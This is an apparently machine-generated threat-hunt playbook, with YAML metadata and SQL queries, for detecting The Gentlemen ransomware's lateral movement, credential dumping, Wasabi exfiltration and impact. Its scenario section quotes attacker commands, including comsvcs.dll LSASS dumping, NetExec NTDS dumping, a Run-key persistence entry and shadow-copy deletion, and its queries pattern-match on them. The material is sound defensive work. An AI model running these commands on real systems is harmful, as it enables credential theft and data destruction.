---
analysis: "A single rule for shadow copy deletion is often too late. This hunt pivots\
  \ across the intrusion chain\u2014correlating rare RMM activity, credential access,\
  \ cloud exfiltration traffic, and impact commands\u2014to identify a systemic threat\
  \ that a single detection rule would miss."
blind_spots:
- id: memory-only-execution
  owner: Detection Engineering
  question: Whether nxc or mimikatz was used to execute shellcode or scripts entirely
    in memory
  remediation: Monitor for unauthorized RMM process memory modifications.
  requires: Memory forensics or process injection hooks
  risk: A hands-on-keyboard actor can interact with the OS without spawning new processes
    or leaving command-line artifacts.
  stage: lateral-movement-rmm-and-netexec
- id: gpo-audit-gap
  owner: Active Directory Team
  question: Whether a GPO was created or modified to execute ransomware
  remediation: Enable and ingest Event ID 5136 and file activity on SYSVOL shares.
  requires: AD auditing of GPO changes (Event ID 5136)
  risk: The ransomware deployment via GPO is only visible on the DC's file system
    or via identity logs.
  stage: impact-gpo-ransomware
coverage:
- stage: credential-access-lsass-dumping
  status: covered
  steps:
  - lsass-dumping-detection
- stage: lateral-movement-rmm-and-netexec
  status: covered
  steps:
  - identify-beachhead-rmm
  - rare-lateral-movement-tools
  - early-stage-triage
- stage: data-exfiltration-rclone
  status: covered
  steps:
  - wasabi-exfiltration
- stage: impact-gpo-ransomware
  status: covered
  steps:
  - ransomware-impact-commands
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: initial-access-trojanized-msi
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: etherrat-execution-node-js
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: persistence-registry-run-key
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: internal-reconnaissance-and-discovery
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: secondary-payload-sideloading
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: blockchain-and-saas-c2
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: The Gentlemen ransomware presents an environment-wide destructive
    risk; identifying the precursors of lateral movement and exfiltration provides
    the final window for containment before encryption.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary has moved laterally from an RMM-controlled beachhead using
  NetExec or GoTo Resolve to dump credentials and exfiltrate data to Wasabi before
  initiating domain-wide encryption via GPO.
labels:
- hunt
- attack.t1003.001
- attack.t1558.003
- attack.t1219
- attack.t1021.001
- attack.t1021.002
- attack.t1567.002
- attack.t1486
- attack.t1489
- attack.t1053.005
- attack.t1484.001
name: 'Lateral Movement and Ransomware Deployment: The Gentlemen'
parameters:
  lateral_tool_filenames:
    default:
    - mimikatz.exe
    - nxc.exe
    - netscan.exe
    - rclone.exe
    description: Filenames of known lateral movement and exfiltration tools.
    from:
      kind: article
      observed: '2026-05-11'
      ref: https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/
    type: list[string]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2026-05-11'
      ref: default-retention
    type: number
  scope_hosts:
    default: []
    description: Hosts identified in the scoping step; leave empty to hunt across
      the entire estate.
    from:
      kind: manual
      observed: '2026-05-11'
      ref: analyst-defined
    type: list[host]
  wasabi_domains:
    default:
    - wasabisys.com
    - wasabi.com
    - s3.wasabisys.com
    description: Cloud storage domains used for data exfiltration.
    from:
      kind: article
      observed: '2026-05-11'
      ref: https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/
    type: list[domain]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on domain controllers and file servers first. Expand scope if SoftPerfect
  or GoTo Resolve execution is found on any workstation.
references:
- name: "DFIR Report \u2014 Flash Alert: EtherRat and TukTuk C2 End in The Gentleman\
    \ Ransomware"
  url: https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/
related:
- hunt: active-directory-gpo-scheduled-task-persistence
  reason: This hunt targets the ransomware impact flow; generic GPO-based persistence
    is a broader identity hunt.
  relation: out-of-scope-alternative
- hunt: decentralized-saas-c2-infrastructure
  relation: follows
scenario:
  stages:
  - name: Trojanized MSI installer
    observables:
    - msiexec.exe /V
    - MVnVmUYj.cmd
    - RAMMap utility masquerade
    slug: initial-access-trojanized-msi
    tactic: initial-access
    techniques:
    - T1204.002
  - name: EtherRAT execution via Node.js
    observables:
    - curl -sLo "C:\Users\REDACTED\AppData\Local\Temp\9gY0LJMyXW.zip" "https://nodejs.org/dist/v18.20.5/node-v18.20.5-win-x64.zip"
    - node-v18.20.5-win-x64.zip
    - node.exe
    - A7Pnj975bl.cfg
    slug: etherrat-execution-node-js
    tactic: execution
    techniques:
    - T1059.003
    - T1105
  - name: Persistence via Registry Run key
    observables:
    - reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AppResolver /d
      "conhost --headless "C:\Users\REDACTED\AppData\Local\P2RsupmqXnmx\gksVMg\node.exe"
      "C:\Users\REDACTED\AppData\Local\P2RsupmqXnmx\A7Pnj975bl.cfg"" /f
    - AppResolver
    slug: persistence-registry-run-key
    tactic: persistence
    techniques:
    - T1547.001
  - name: Internal reconnaissance and discovery
    observables:
    - powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "[System.Globalization.CultureInfo]::InstalledUICulture.Name"
    - powershell -Command "try { (Get-CimInstance -Namespace root/SecurityCenter2
      -ClassName AntivirusProduct -EA Stop).displayName -join ', ' } catch { 'none'
      }"
    - net group "Domain Admins" /domain
    - nltest /domain_trusts /all_trusts
    - netscan.exe
    slug: internal-reconnaissance-and-discovery
    tactic: discovery
    techniques:
    - T1082
    - T1518.001
    - T1087.002
    - T1018
  - name: TukTuk deployment via DLL sideloading
    observables:
    - Greenshot.exe
    - SyncTrayzor.exe
    - docfx.exe
    - Cake.exe
    slug: secondary-payload-sideloading
    tactic: defense-evasion
    techniques:
    - T1574.002
  - name: Blockchain and SaaS C2
    observables:
    - 1rpc.io
    - goldsky.arweave.net
    - trycloudflare.com
    - supabase.co
    - 1rpc.io
    - goldsky.arweave.net
    slug: blockchain-and-saas-c2
    tactic: command-and-control
    techniques:
    - T1102.001
    - T1572
  - name: Credential Access via LSASS dumping
    observables:
    - 'rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24'
    - Kerberoasting
    - NTDS dumping
    slug: credential-access-lsass-dumping
    tactic: credential-access
    techniques:
    - T1003.001
    - T1558.003
  - name: Lateral movement via RMM and NetExec
    observables:
    - GoToResolveProcessChecker.exe
    - nxc smb REDACTED_IP -u REDACTED_USER -p REDACTED_PASSWORD --ntds
    - nxc
    - winrm
    slug: lateral-movement-rmm-and-netexec
    tactic: lateral-movement
    techniques:
    - T1219
    - T1021.001
    - T1021.002
  - name: Data exfiltration via Rclone
    observables:
    - rclone
    - Wasabi cloud storage
    slug: data-exfiltration-rclone
    tactic: exfiltration
    techniques:
    - T1567.002
  - name: Ransomware deployment via GPO
    observables:
    - The Gentlemen ransomware
    - Microsoft Defender disabled
    - GPO execution via SYSVOL/NETLOGON
    - vssadmin.exe delete shadows
    slug: impact-gpo-ransomware
    tactic: impact
    techniques:
    - T1486
    - T1489
    - T1053.005
    - T1484.001
  summary: A threat actor used a trojanized MSI installer to deploy EtherRAT, leveraging
    Ethereum blockchain and TryCloudflare for resilient C2 before deploying the TukTuk
    framework via DLL sideloading. The intrusion progressed through extensive AD discovery
    and lateral movement using NetExec and GoTo Resolve, concluding with data exfiltration
    via Rclone and domain-wide deployment of The Gentleman ransomware via GPO and
    scheduled tasks.
series:
  index: 3
  slug: flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware
  title: 'Flash Alert: EtherRat and TukTuk C2 End in The Gentleman Ransomware'
  total: 3
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# Lateral Movement and Ransomware Deployment: The Gentlemen

This hunt targets the hands-on-keyboard phase of a ransomware intrusion. It begins by scoping for hosts showing portable RMM execution, such as GoTo Resolve or SoftPerfect, which are used as beachheads. The first phase hunts for credential dumping and lateral tools by looking for behavioral strings and original file names that survive renaming. The second phase corroborates this with network traffic to cloud storage and final-stage impact commands. An agent correlates these stages to distinguish administrative activity from a ransomware kill chain.

## identify-beachhead-rmm
<!-- Identify portable RMM and scanner execution -->
Locate hosts running GoTo Resolve or SoftPerfect Network Scanner. These define the primary hosts of interest for the lateral movement phase.

```sqlite target=endpoint role=scoping params=(lookback_days=lookback_days)
~~~yaml
expected: Execution of GoTo Resolve or NetScan binaries. Silence means these specific
  tools were not launched, not that no RMM activity occurred.
reads:
- device_hostname
- process_name
- process_path
- process_cmd_line
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT device_hostname, process_name, process_path, process_cmd_line, time FROM hb_process_activity WHERE (LOWER(process_cmd_line) LIKE '%goto%resolve%' OR LOWER(process_name) LIKE '%netscan%' OR LOWER(process_cmd_line) LIKE '%netscan%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## early-stage-investigation
<!-- Parallel Credential Access and Lateral Tool Hunting -->
parallel:
- → lsass-dumping-detection
- → rare-lateral-movement-tools
join: → early-stage-triage

## lsass-dumping-detection
<!-- LSASS dumping via comsvcs -->
Identify process execution targeting LSASS memory using the comsvcs.dll ordinal technique.

```sqlite target=endpoint role=triage params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: 'Command lines containing rundll32 and comsvcs.dll ordinal #24. This is
  a high-fidelity indicator of credential dumping.'
reads:
- device_hostname
- process_name
- process_cmd_line
- user_name
- time
silence: evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT device_hostname, process_name, process_cmd_line, user_name, time FROM hb_process_activity WHERE LOWER(process_cmd_line) LIKE '%comsvcs.dll%#+0000%24%' AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## rare-lateral-movement-tools
<!-- Rare lateral tools by original name and behavior -->
Identify lateral movement tools that may have been renamed to bypass process name detections.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days, scope_hosts=scope_hosts, lateral_tool_filenames=lateral_tool_filenames)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Processes whose original file name or command line strings match known lateral
  tools. Rare occurrences (1-3 hosts) indicate adversary use.
prevalence:
  by: device_hostname
  key:
  - process_original_file_name
  rare_below: 3
reads:
- device_hostname
- process_original_file_name
- process_cmd_line
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT LOWER(process_original_file_name) AS original_name, COUNT(DISTINCT device_hostname) AS hosts, MIN(time) AS first_seen FROM hb_process_activity WHERE (instr(',' || '{{lateral_tool_filenames}}' || ',', ',' || LOWER(process_original_file_name) || ',') > 0 OR LOWER(process_cmd_line) LIKE '%sekurlane%' OR LOWER(process_cmd_line) LIKE '%lsadump%' OR LOWER(process_cmd_line) LIKE '%netexec%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY 1 HAVING hosts <= 3
```

## early-stage-triage
<!-- Weigh early-stage evidence -->
```agent target=hunter
cite: required
context:
- identify-beachhead-rmm
- lsass-dumping-detection
- rare-lateral-movement-tools
max_iterations: 3
objective: Identify hosts showing a high-confidence chain of beachhead RMM use followed
  by credential access and lateral tool execution.
success_criteria: A per-host verdict of malicious | suspicious citing specific process
  and original filename rows.
tools:
- endpoint
```

## follow-on-investigation
<!-- Parallel Impact and Exfiltration Hunting -->
parallel:
- → wasabi-exfiltration
- → ransomware-impact-commands
join: → final-killchain-assessment

## wasabi-exfiltration
<!-- DNS lookups to Wasabi cloud storage -->
Identify outbound traffic to Wasabi, which the adversary used with Rclone for data exfiltration.

```sqlite target=endpoint role=enrichment params=(lookback_days=lookback_days, scope_hosts=scope_hosts, wasabi_domains=wasabi_domains)
~~~yaml
expected: DNS queries for Wasabi domains from hosts identified in the early movement
  phase. Suspicious if originating from servers not performing authorized backups.
reads:
- device_hostname
- process_name
- query_hostname
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT device_hostname, process_name, query_hostname, COUNT(*) AS lookups FROM hb_dns_activity WHERE instr(',' || '{{wasabi_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0 AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY 1, 2, 3
```

## ransomware-impact-commands
<!-- Destructive behavior and AV tampering -->
Identify the high-fidelity impact commands used by The Gentlemen ransomware, including shadow copy deletion and Defender disabling.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: Commands used to delete backups and disable security controls. Any hit on
  a production server or DC is critical.
reads:
- device_hostname
- process_name
- process_cmd_line
- user_name
- time
silence: evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT device_hostname, process_name, process_cmd_line, user_name, time FROM hb_process_activity WHERE (LOWER(process_cmd_line) LIKE '%vssadmin%delete%shadows%' OR LOWER(process_cmd_line) LIKE '%disable-mppreference%' OR LOWER(process_cmd_line) LIKE '%shadowcopy%delete%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## final-killchain-assessment
<!-- Final ransomware kill-chain triage -->
```agent target=hunter
cite: required
context:
- early-stage-triage
- wasabi-exfiltration
- ransomware-impact-commands
max_iterations: 4
objective: Determine if the evidence chain from early movement to final destruction
  confirms an active Gentlemen ransomware intrusion.
success_criteria: A verdict that links the hosts from the first agent to the exfiltration
  and impact findings, confirming a logical progression of an intrusion.
tools:
- endpoint
```

## intrusion-confirmed
<!-- Route on ransomware verdict -->
if~: "the final-killchain-assessment verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → manual-gpo-audit
unavailable: → manual-gpo-audit (blind_spot: memory-only-execution)
else: → hunt-close-out

## isolate-host
<!-- Isolate host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host immediately via the EDR. Proceed to manual review of GPO and RMM logs.
```
→ manual-gpo-audit

## manual-gpo-audit
<!-- Manual GPO and RMM audit -->
```manual target=analyst
Check Active Directory for recent GPO modifications in SYSVOL/NETLOGON. Review GoTo Resolve console logs for unauthorized tasks launched from beachhead IPs.
```
→ hunt-close-out

## hunt-close-out
<!-- Hunt closure -->
```manual target=analyst
Record the hosts examined and whether the intrusion chain was present. If destructive behavior was found, pivot to Incident Response.
```
→ end
